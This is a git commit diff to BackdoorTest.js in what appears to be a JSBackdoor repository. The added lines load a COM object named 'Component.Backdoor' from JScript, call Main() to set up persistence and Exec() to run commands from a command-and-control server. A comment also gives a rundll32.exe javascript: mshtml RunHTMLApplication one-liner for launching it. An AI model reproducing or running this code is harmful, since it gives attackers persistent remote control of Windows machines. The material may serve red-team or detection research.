07facfebf6f8028a1f3f7e97ac071333b6646b74
3gstudent <robertpetersen@outlook.com>
2016-04-18 17:57:18 -0700

    Update BackdoorTest.js

--- JSBackdoor/BackdoorTest.js
+++ JSBackdoor/BackdoorTest.js
@@ -1,2 +1,9 @@
-var ref = new ActiveXObject("JSRAT");
-ref.Exec();
+//rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();x=new%20ActiveXObject("Component.Backdoor");x.Main();
+//We need to Call Main At least Once To Establish Persistence.
+
+var x = new ActiveXObject("Component.Backdoor");
+x.Main();
+
+//After That, Just Call your method defined in the c2 :-)
+var x = new ActiveXObject("Component.Backdoor");
+x.Exec();
